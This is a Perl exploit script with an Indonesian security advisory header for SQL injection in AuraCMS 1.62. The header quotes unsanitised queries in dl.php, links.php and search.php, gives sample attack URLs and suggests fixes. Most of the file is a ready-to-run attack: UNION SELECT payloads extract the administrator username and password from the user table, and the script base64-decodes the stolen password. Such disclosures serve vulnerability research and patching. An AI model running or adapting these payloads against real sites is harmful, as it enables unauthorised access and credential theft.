#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 1.62   Multiple Remote SQL Injection Exploit
# Waktu			:  Feb 15 2008 01:00PM
# Software		:  AuraCMS
# Versi			:  1.62
# Vendor 		:  http://www.auracms.org/
#
# ------------------------------------
# Audit Oleh 		:  NTOS-Team
# Lokasi		:  Indonesia | http://newhack.org
# Penjelasan		:
#
# => Kutu pada berkas /mod/dl.php
# --//--
#  8. 	$aksi=$_GET[aksi];
#  9.	$laporan=$_GET[laporan];
# 10.	$kategori=$_GET[kategori]; if(!$kategori) $kategori=$_POST[kategori];
# 11.	$kid=$_GET[kid]; if(!$kid) $kid=$_POST[kid];
# 12.	$id=$_GET[id]; if(!$id) $id=$_POST[id];
# 13.	$submit=$_POST[submit];
# 14.	$mulai=$_GET[mulai];
# 15.	$hal=$_GET[hal];
# 16.	$brokens=$_GET[brokens];
# --//--
# 59.if ($aksi=="lihat"){
# 60.
# 61.$numresult = mysql_query("SELECT * FROM dl WHERE kid='$kid' AND tipe='aktif' ORDER BY id DESC");
# 62.
# 63.$jmlrec = mysql_num_rows($numresult);
# --//--
# jika magic_quotes_gpc = off pada server maka pengguna dapat memanipulasi pernyataan SQL secara remote pada variabel "kid"
# Contoh;
# http://site.korban/auracms162/index.php?pilih=dl&mod=yes&aksi=lihat&kategori=&kid=-9'[SQLI]
#
# => Kutu pada berkas /mod/links.php
# --//--
#  8.	$aksi=$_GET[aksi];
#  9.	$kategori=$_GET[kategori]; if(!$kategori) $kategori=$_POST[kategori];
# 10.	$kid=$_GET[kid]; if(!$kid) $kid=$_POST[kid];
# 11.	$id=$_GET[id]; if(!$id) $id=$_POST[id];
# 12.	$submit=$_POST[submit];
# 13.	$mulai=$_GET[mulai];
# 14.	$hal=$_GET[hal];
# 15.	$brokens=$_GET[brokens];
# 16.	$laporan=$_GET[laporan];
# --//--
# 59.if ($aksi=="lihat"){
# 60.
# 61.$numresult = mysql_query("SELECT * FROM links WHERE kid='$kid' AND tipe='aktif' ORDER BY id DESC");
# 62.
# 63.$jmlrec = mysql_num_rows($numresult);
# --//--
# jika magic_quotes_gpc = off pada server maka pengguna dapat memanipulasi pernyataan SQL secara remote pada variabel "kid"
# Contoh;
# http://site.korban/auracms162/index.php?pilih=links&mod=yes&aksi=lihat&kategori=&kid=-9'[SQLI]
#
# => Kutu pada berkas /search.php
# --//--
#  8. $query=$_GET[query];
# --//--
# 19.  	$perintah="SELECT * FROM artikel WHERE ((judul LIKE '%$query%' OR konten LIKE '%$query%' OR user LIKE '%$query%')AND publikasi=1)";
# 20.	$hasil=mysql_query($perintah, $koneksi_db);
# 21.	$jumlah1=mysql_numrows($hasil);
# 22.
# 23.	$perintah="SELECT * FROM halaman WHERE (judul LIKE '%$query%' OR konten LIKE '%$query%')";
# 24.	$hasil=mysql_query($perintah, $koneksi_db);
# 25. 	$jumlah2=mysql_numrows($hasil);
# --//--
# jika magic_quotes_gpc = off pada server maka pengguna dapat memanipulasi pernyataan SQL secara remote pada variabel "query"
# Contoh;
# http://site.korban/index.php?query=t4mugel4p')[SQLI]&pilih=search
#
# => perbaikan sederhana
# pada berkas "mod/dl.php" dan "mod/links.php"
# ubah kode ;
# $kid=$_GET[kid]; if(!$kid) $kid=$_POST[kid];
# menjadi
# $kid=(int)$_GET[kid]; if(!$kid) $kid=(int)$_POST[kid];
# dan buat magic_quotes_gpc = on pada server
# pada berkas "/search.php" buat fungsi penyaringan "query" dan hidupkan magic_quotes_gpc
#
# => Perhatian!
# "Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari"
# Segela penyalahgunaan dan kerusakan yang diakibat dari exploit ini bukan tanggung jawab kami
#
# =>Newhack Technology, OpenSource & Security
# ~ NTOS-Team->[fl3xu5,k1tk4t,opt1lc] ~
use LWP::UserAgent;
use Getopt::Long;
use MIME::Base64;

if(!$ARGV[2])
{
 print "\n  |-------------------------------------------------------|";
 print "\n  |            Indonesian Newhack Technology              |";
 print "\n  |-------------------------------------------------------|";
 print "\n  |  AuraCMS 1.62 Multiple Remote SQL Injection Exploit   |";
 print "\n  |                Coded by NTOS-Team                     |";
 print "\n  |-------------------------------------------------------|";
 print "\n[!] ";
 print "\n[!] Exploit Berhasil jika magic_quotes_gpc = off pada server";
 print "\n[!] Penggunaan : perl aura162sqli.pl [Site] [Path] [Option]";
 print "\n[!] [Option] 1 = dl.php   |  2 = links.php | 2 = search.php ";
 print "\n[!] Contoh     : perl aura162sqli.pl localhost /aura162/ -o 1";
 print "\n[!] ";
 print "\n";
 exit;
}
$site 		= $ARGV[0]; # Site Target
$path 		= $ARGV[1]; # Path direktori vKios

%options = ();
GetOptions(\%options, "o=i",);
if($options{"o"} && $options{"o"} == 1)
{
$sql = "http://".$site.$path."index.php?pilih=dl&mod=yes&aksi=lihat&kategori=&kid=-999'union+select+concat(0x74346d7520,user,0x20673074),0,0,concat(0x67656c347020,password,0x20673074),0,0,0,0,0,0%20from%20user+limit+0,1/*";
}
if($options{"o"} && $options{"o"} == 2)
{
$sql = "http://".$site.$path."index.php?pilih=links&mod=yes&aksi=lihat&kategori=&kid=-999'union+select+concat(0x74346d7520,user,0x20673074),0,0,concat(0x67656c347020,password,0x20673074),0,0,0,0,0,0%20from%20user+limit+0,1/*";
}
if($options{"o"} && $options{"o"} == 3)
{
$sql = "http://".$site.$path."index.php?query=1nj3ks1')union+select+0,concat(0x74346d7520,user,0x20673074),concat(0x67656c347020,password,0x20673074)+from+user+limit+0,1/*&pilih=search";
}

$www = new LWP::UserAgent;
print "\n\n [!] Injeksi SQL \n";
$res = $www -> get($sql) or err();
$hasil = $res -> content;
if( $hasil =~ /t4mu (.*?) g0t/ )
{
print "\n [+] Username      : $1";
$hasil =~ /gel4p (.*?) g0t/ , print "\n [+] Password      : $1";
print "\n [+] base64 decode : "; print decode_base64($1); print "\n\n"
}
else
{
print "\n [-] Exploit gagal ;) - magic_quotes_gpc = on";
exit();
}

# milw0rm.com [2008-02-16]